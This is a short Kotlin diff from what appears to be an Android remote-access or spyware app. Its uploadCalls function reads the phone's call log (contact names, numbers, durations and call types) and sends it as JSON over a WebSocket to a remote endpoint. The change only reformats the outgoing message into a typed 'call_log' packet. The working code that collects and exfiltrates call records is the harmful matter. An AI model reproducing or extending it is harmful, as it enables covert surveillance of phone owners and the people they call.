@@ -13,7 +13,6 @@ import java.io.IOException
 import java.io.OutputStreamWriter
 
     object callutil {
-        private val uiHandler = Handler(Looper.getMainLooper())
         fun uploadCalls(contentResolver: ContentResolver,webSocket: WebSocket) {
             val numberCol = CallLog.Calls.NUMBER
             val durationCol = CallLog.Calls.DURATION
@@ -37,7 +36,8 @@ import java.io.OutputStreamWriter
                 text += "Contact:$contactName\nnumber : $number\nduration : $duration\nType : $typeCorrect\n\n" }
             cursor?.close()
            val jsontext = JSONObject()
-            jsontext.put("call_logs",text)
+            jsontext.put("type","call_log")
+            jsontext.put("data",text);
             webSocket.send(jsontext.toString())
         }
     }
